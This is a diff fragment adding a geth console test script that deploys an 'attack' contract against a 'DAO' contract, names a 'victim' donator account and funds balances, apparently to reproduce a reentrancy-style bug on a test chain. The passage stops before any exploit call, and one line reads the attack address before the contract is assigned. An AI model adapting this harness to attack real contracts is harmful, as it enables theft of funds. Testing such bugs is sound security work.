@@ -1,0 +1,26 @@
+gas: '4700000'
+	   }, function (e, contract){
+	    if (typeof contract.address !== 'undefined') {
+        attackAddr=attack.address;
+
+		attack = attackContract.at(attackAddr);
+		console.log("Test ::: Created Attack contract: " + attackAddr);
+
+		var donator=eth.accounts[1];
+		console.log("Test ::: Attack is me: " + me);
+		console.log("Test ::: Real Attack contract: " + attackAddr);
+		console.log("Test ::: DAO contract: " + daoAddr);
+		console.log("Test ::: The victim of the bug - a donator: " + donator);
+		// bank.donate(attackAddr, {from: me, value: 1000}); 
+		// bank.addBalance(attackAddr, {from: me, value:1000}); 
+		attack.addBalance.call({from:me, value:1000});
+		admin.sleepBlocks(3);
+
+		// // dao.donate(donator, {from: me, value: 3000}); 
+		dao.addBalance(donator, {from: me, value: 3000}); 
+        admin.sleepBlocks(3);
+
+		// console.log("Test ::: Before: DAO has " + eth.getBalance(daoAddr) + " and Attack has " + eth.getBalance(attackAddr));
+        // console.log(dao.getBalance.call(attackAddr))
+
+		// eth.sendTransaction({from: me, to: attackAddr, value: 1, gas: 500000}); 
